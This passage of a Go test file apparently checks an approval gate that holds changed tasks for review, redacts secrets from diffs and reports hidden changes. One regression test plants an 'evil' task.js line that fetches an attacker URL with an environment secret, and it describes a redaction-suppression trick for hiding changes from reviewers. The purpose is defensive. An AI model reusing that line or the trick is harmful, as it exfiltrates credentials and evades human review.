// endpoint and the unauthenticated /approve/{token} page — must never carry
// the literal.
//
// Known still-uncovered forms are asserted as such in
// TestRedactSecretsKnownGaps rather than silently omitted.
func TestRedactSecretsCoversNonLineFormats(t *testing.T) {
	cases := map[string]string{
		"flow mapping":  "permissions:\n  env: [{name: A, value: sk-live-FLOWSTYLE}]\n",
		"flow seq item": "permissions:\n  env:\n    - {name: A, value: sk-live-FLOWSEQ}\n",
		"uppercase key": "permissions:\n  env:\n    - name: A\n      Value: sk-live-UPPERKEY\n",
		"default key":   "permissions:\n  env:\n    - name: A\n      default: sk-live-DEFAULTKEY\n",
	}
	for name, in := range cases {
		out := redactSecrets(in)
		if strings.Contains(out, "sk-live-") {
			t.Errorf("%s: literal survived redaction:\n%s", name, out)
		}
	}
}

// TestRedactSecretsKnownGaps pins the forms redaction does NOT yet cover, so
// the gap is visible in the test suite rather than discovered on a leak. Each
// is a legal task.yaml that binds to EnvEntry.Value. See issue for the
// YAML-node-driven redaction that closes them.
func TestRedactSecretsKnownGaps(t *testing.T) {
	gaps := map[string]string{
		// A multiline scalar's parsed value ("a b") never appears verbatim in
		// the bytes ("a\n  b"), so the content sweep cannot match it.
		"plain multiline scalar": "permissions:\n  env:\n    - name: A\n      value: part-one\n        sk-live-CONTINUATION\n",
		// The documented KEY=VALUE shorthand is a bare seq string, not a
		// mapping under a value: key, so the sweep never collects it.
		"KEY=VALUE shorthand": "permissions:\n  env:\n    - TOKEN=sk-live-SHORTHAND\n",
	}
	for name, in := range gaps {
		if !strings.Contains(redactSecrets(in), "sk-live-") {
			t.Errorf("%s is now redacted — good; remove it from the known-gap list", name)
		}
	}
}

// TestDiffSuppressionAttack is the regression for the redaction-suppression
// attack: a block-scalar marker planted at column 0 in any snapshotted file
// makes redactValueLines swallow everything indented below it, so two
// entirely different versions scrub to identical text. Deciding changed-vs-
// unchanged on redacted text let that file drop out of Files permanently
// while the content hash still pended the task — a self-installed blind spot.
func TestDiffSuppressionAttack(t *testing.T) {
	g, _, _ := newTestGate(t, enabledPolicy())
	benign := "const _d = `\nvalue: |\n  `;\n  export default async () => { /* benign */ };\n"
	spec := writeTaskDir(t, t.TempDir(), "repo/supp", benign)

	if _, err := g.Admit(spec); err != nil {
		t.Fatal(err)
	}
	if err := g.Approve("repo/supp"); err != nil {
		t.Fatal(err)
	}

	evil := "const _d = `\nvalue: |\n  `;\n  export default async () => { await fetch('https://evil/'+Deno.env.get('T')); };\n"
	if err := os.WriteFile(filepath.Join(spec.TaskDir, "task.js"), []byte(evil), 0o644); err != nil {
		t.Fatal(err)
	}
	armed, err := g.Admit(spec)
	if err != nil {
		t.Fatal(err)
	}
	if armed {
		t.Fatal("gate armed a changed task; the rest of this test assumes it pends")
	}

	d, err := g.Diff("repo/supp")
	if err != nil {
		t.Fatal(err)
	}
	var js *FileDiff
	for i := range d.Files {
		if d.Files[i].Path == "task.js" {
			js = &d.Files[i]
		}
	}
	if js == nil {
		t.Fatalf("task.js changed and the task is pending, but it is absent from the diff: %+v", d.Files)
	}
	// Its content is hidden by the attacker's own marker, so the operator
	// must be told the change exists and cannot be shown here.
	if !js.ContentHidden {
		t.Error("a file whose change is entirely inside redacted content must be marked ContentHidden")
	}
	if !d.Incomplete || d.IncompleteReason == "" {
		t.Error("a diff that cannot show a real change must be marked Incomplete with a reason")
	}
}

// TestDiffRendersPureResolvedConfigChange covers a task re-held with every
// file in its directory byte-identical — a taskset override rewriting its
// permissions. Nothing in the directory changed, so the resolved-config entry
// is the only thing that can carry it.
func TestDiffRendersPureResolvedConfigChange(t *testing.T) {
	g, _, _ := newTestGate(t, enabledPolicy())
	spec := writeTaskDir(t, t.TempDir(), "repo/ovr", "export default () => {}\n")
	if _, err := g.Admit(spec); err != nil {
		t.Fatal(err)
	}
	if err := g.Approve("repo/ovr"); err != nil {
		t.Fatal(err)
	}

	// Re-pend with the directory untouched, as a taskset override would.
	spec2 := &task.Spec{ID: "repo/ovr", TaskDir: spec.TaskDir,
		Permissions: task.Permissions{Net: []string{"*"}}}
	if _, err := g.Admit(spec2); err != nil {
		t.Fatal(err)
	}
	d, err := g.Diff("repo/ovr")
	if err != nil {
		t.Fatal(err)
	}
	if len(d.Files) != 1 || d.Files[0].Path != resolvedConfigPath {
		t.Fatalf("want exactly the resolved-config entry, got %+v", d.Files)
	}
	if !strings.Contains(d.Files[0].UnifiedDiff, "*") {
		t.Errorf("the widened net value should be visible:\n%s", d.Files[0].UnifiedDiff)
	}
	if d.Incomplete {
		t.Errorf("the change is rendered, so it is not incomplete: %q", d.IncompleteReason)
	}
}

// TestDiffRendersResolvedConfigChange covers a change that spans both sides of
// the snapshot's horizon: an ordinary file edit plus a taskset override
// widening permissions. The override never touches the task directory, so no
// file diff can carry it — it is rendered as its own entry instead, showing
// the actual before/after rather than merely warning that something changed.
func TestDiffRendersResolvedConfigChange(t *testing.T) {
	g, _, _ := newTestGate(t, enabledPolicy())
	root := t.TempDir()
	spec := writeTaskDir(t, root, "repo/combo", "VERSION_A\n")
	if _, err := g.Admit(spec); err != nil {
		t.Fatal(err)
	}
	if err := g.Approve("repo/combo"); err != nil {
		t.Fatal(err)
	}

	// One commit: cosmetic file edit AND an out-of-dir permissions widening.
	if err := os.WriteFile(filepath.Join(spec.TaskDir, "task.js"), []byte("VERSION_B\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	widened := &task.Spec{ID: "repo/combo", TaskDir: spec.TaskDir,
		Permissions: task.Permissions{Net: []string{"*"}}}
	if _, err := g.Admit(widened); err != nil {
		t.Fatal(err)
	}

	d, err := g.Diff("repo/combo")
	if err != nil {
		t.Fatal(err)
	}
	var fileSeen bool
	var resolved *FileDiff
	for i := range d.Files {
		switch d.Files[i].Path {
		case "task.js":
			fileSeen = true
		case resolvedConfigPath:
			resolved = &d.Files[i]
		}
	}
	if !fileSeen {
		t.Error("the in-directory file edit should still render")
	}
	if resolved == nil {
		t.Fatalf("the out-of-dir permissions widening is not in the diff: %+v", d.Files)
	}
	if !resolved.SecurityRelevant {
		t.Error("resolved-config changes are security-bearing by construction")
	}
	if !strings.Contains(resolved.UnifiedDiff, "*") {
		t.Errorf("the widened net value should be visible:\n%s", resolved.UnifiedDiff)
	}
	// It is shown, so it does not need the "cannot be displayed" warning.
	if d.Incomplete {
		t.Errorf("a rendered change must not also be reported as unshowable: %q", d.IncompleteReason)
	}
}

// TestDiffNoResolvedEntryWhenUnchanged guards against the entry appearing on
// every diff: an in-directory edit that leaves the resolved fields alone must
// not produce a spurious "(resolved config)" entry.
func TestDiffNoResolvedEntryWhenUnchanged(t *testing.T) {
	g, _, _ := newTestGate(t, enabledPolicy())
	spec := writeTaskDir(t, t.TempDir(), "repo/plain", "VERSION_A\n")
	if _, err := g.Admit(spec); err != nil {
		t.Fatal(err)
	}
	if err := g.Approve("repo/plain"); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(spec.TaskDir, "task.js"), []byte("VERSION_B\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := g.Admit(spec); err != nil {
		t.Fatal(err)
	}
	d, err := g.Diff("repo/plain")
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range d.Files {
		if f.Path == resolvedConfigPath {
			t.Errorf("resolved config is unchanged but was rendered:\n%s", f.UnifiedDiff)
		}
	}
	if d.Incomplete {
		t.Errorf("an ordinary visible file change must not be flagged incomplete: %q", d.IncompleteReason)
	}
}

// TestDiffIncompleteWhenNoPendingSnapshot covers the early return for a task
// with no pending snapshot (dir-less, or a snapshot failure on first pend).
// The gate is holding it on a hash change this surface cannot account for at
// all, which must never render as an empty all-clear.
func TestDiffIncompleteWhenNoPendingSnapshot(t *testing.T) {
	g, _, _ := newTestGate(t, enabledPolicy())
	inline := &task.Spec{ID: "repo/inline"} // no TaskDir
	if _, err := g.Admit(inline); err != nil {
		t.Fatal(err)
	}
	d, err := g.Diff("repo/inline")
	if err != nil {
		t.Fatal(err)
	}
	if len(d.Files) != 0 {
		t.Fatalf("expected no files for a dir-less task, got %+v", d.Files)
	}
	if !d.Incomplete || d.IncompleteReason == "" {
		t.Fatal("a pending task with no snapshot must report Incomplete with a reason")
	}
}

// TestRedactSecretsCoversWebhookSecret pins the inline HMAC key out of every
// diff surface. trigger.webhook_secret authenticates inbound webhook requests;
// ContentHash already strips it so it never reaches the committable lock, and
// the diff — which includes the session-less /approve/{token} page — must not
// be the weaker surface. Leaking it hands any approve-link holder the ability
// to forge authenticated triggers for that task.
func TestRedactSecretsCoversWebhookSecret(t *testing.T) {
	in := "name: t\ntrigger:\n  webhook: /hooks/x\n  webhook_secret: SUPERSECRET_HMAC_abc123\n  auth: any\n"
	out := redactSecrets(in)
	if strings.Contains(out, "SUPERSECRET_HMAC_abc123") {
		t.Errorf("inline webhook_secret survived redaction:\n%s", out)
	}
	// The field must still be visibly present, so a diff shows that it changed.
	if !strings.Contains(out, "webhook_secret:") {
		t.Errorf("redaction removed the key as well as the value:\n%s", out)
	}
}

// TestDiffRedactsParamDefault is the regression for a params[].default leak:
// resolvedFieldsOf feeds both ContentHash and resolvedFieldsText, and the
// latter (since 7574aba) is what Diff renders verbatim onto every diff
// surface, including the session-less /approve/{token} page. A param default
// is task-author-controlled and can carry a credential — the same class of
// material as permissions.env's Value/Default — so it must be redacted the
// same way rather than reaching the rendered diff intact.
func TestDiffRedactsParamDefault(t *testing.T) {
	g, _, _ := newTestGate(t, enabledPolicy())
	spec := writeTaskDir(t, t.TempDir(), "repo/paramsecret", "export default () => {}\n")
	if _, err := g.Admit(spec); err != nil {
		t.Fatal(err)
	}
	if err := g.Approve("repo/paramsecret"); err != nil {
		t.Fatal(err)
	}

	secret := "sk-live-PARAMSECRET"
	widened := &task.Spec{ID: "repo/paramsecret", TaskDir: spec.TaskDir,
		Params: []task.Param{{Name: "api_key", Default: secret, Required: true}}}
	if _, err := g.Admit(widened); err != nil {
		t.Fatal(err)
	}

	d, err := g.Diff("repo/paramsecret")
	if err != nil {
		t.Fatal(err)
	}
	var resolved *FileDiff
	for i := range d.Files {
		if d.Files[i].Path == resolvedConfigPath {
			resolved = &d.Files[i]
		}
	}
	if resolved == nil {
		t.Fatalf("expected a resolved-config entry for the new param default, got: %+v", d.Files)
	}
	if strings.Contains(resolved.UnifiedDiff, secret) {
		t.Errorf("param default leaked into the diff:\n%s", resolved.UnifiedDiff)
	}
	// json.MarshalIndent HTML-escapes redactedEnvValue's angle brackets by
	// default, so match on the bare word rather than the constant's literal
	// "<redacted>" text.
	if !strings.Contains(resolved.UnifiedDiff, "redacted") {
		t.Errorf("expected the redacted placeholder in the diff:\n%s", resolved.UnifiedDiff)
	}
}

// TestTrustedTaskRefreshesApprovedBaselineOnHashChange is the regression for
// a stale Diff baseline on the auto-approve path: snapshotApprovedIfMissing
// only snapshots when approvedFiles[id] is not yet cached, so a second
// (changed) hash sailing through as trusted left the baseline pinned to the
// FIRST trusted version forever. Once trust is later revoked and the task
// pends again, Diff must compare against the version that was actually last
// approved, not a stale first snapshot from before the intervening edit.
func TestTrustedTaskRefreshesApprovedBaselineOnHashChange(t *testing.T) {
	p := enabledPolicy()
	p.TrustedTasks["repo/trust"] = true
	g, _, _ := newTestGate(t, p)
	root := t.TempDir()

	if _, err := g.Admit(writeTaskDir(t, root, "repo/trust", "VERSION_A\n")); err != nil {
		t.Fatal(err)
	}
	if _, err := g.Admit(writeTaskDir(t, root, "repo/trust", "VERSION_B\n")); err != nil {
		t.Fatal(err)
	}

	// Revoke trust, then pend a further change.
	delete(p.TrustedTasks, "repo/trust")
	armed, err := g.Admit(writeTaskDir(t, root, "repo/trust", "VERSION_C\n"))
	if err != nil {
		t.Fatal(err)
	}
	if armed {
		t.Fatal("expected the task to pend once trust is revoked and content changes again")
	}

	d, err := g.Diff("repo/trust")
	if err != nil {
		t.Fatal(err)
	}
	var jsDiff *FileDiff
	for i := range d.Files {
		if d.Files[i].Path == "task.js" {
			jsDiff = &d.Files[i]
		}
	}
	if jsDiff == nil {
		t.Fatalf("task.js not in diff: %+v", d.Files)
	}
	if strings.Contains(jsDiff.UnifiedDiff, "VERSION_A") {
		t.Errorf("diff baseline is stale — compared against the first trusted version instead of the last one:\n%s", jsDiff.UnifiedDiff)
	}
	if !strings.Contains(jsDiff.UnifiedDiff, "- VERSION_B") {
		t.Errorf("expected the last-approved version (B) as the diff's old side:\n%s", jsDiff.UnifiedDiff)
	}
}

// TestPendingSnapshotRetriesAfterEarlierFailure is the regression for a stuck
// snapshot: if a dir-backed task's first takeSnapshot call fails, files stays
// nil, and every later Admit at that same (unchanged) hash sets changed =
// false — before this fix, the walk below never ran again, and Diff stayed
// Incomplete forever even once the underlying failure had cleared. This seeds
// the exact stuck state a failure leaves behind (files == nil, hash pinned)
// rather than the I/O failure that produces it — root in this sandbox
// bypasses the permission errors that would normally trigger it, and the
// fix's condition is what's under test either way.
func TestPendingSnapshotRetriesAfterEarlierFailure(t *testing.T) {
	g, _, _ := newTestGate(t, enabledPolicy())
	spec := writeTaskDir(t, t.TempDir(), "repo/retry", "export default () => {}\n")

	hash, err := g.hashFn(spec)
	if err != nil {
		t.Fatal(err)
	}
	g.mu.Lock()
	g.pending[spec.ID] = pendingEntry{kinded: spec, hash: hash, files: nil, resolved: resolvedFieldsText(spec)}
	g.mu.Unlock()

	// Same hash, same content: an ordinary reconcile poll finding nothing
	// changed. The task dir is real and readable, so a retried snapshot
	// succeeds this time.
	if _, err := g.Admit(spec); err != nil {
		t.Fatal(err)
	}

	d, err := g.Diff(spec.ID)
	if err != nil {
		t.Fatal(err)
	}
	if d.Incomplete {
		t.Errorf("expected the retried snapshot to succeed and clear Incomplete, got reason: %q", d.IncompleteReason)
	}
	if len(d.Files) == 0 {
		t.Error("expected the retried snapshot's files to appear in the diff")
	}
}
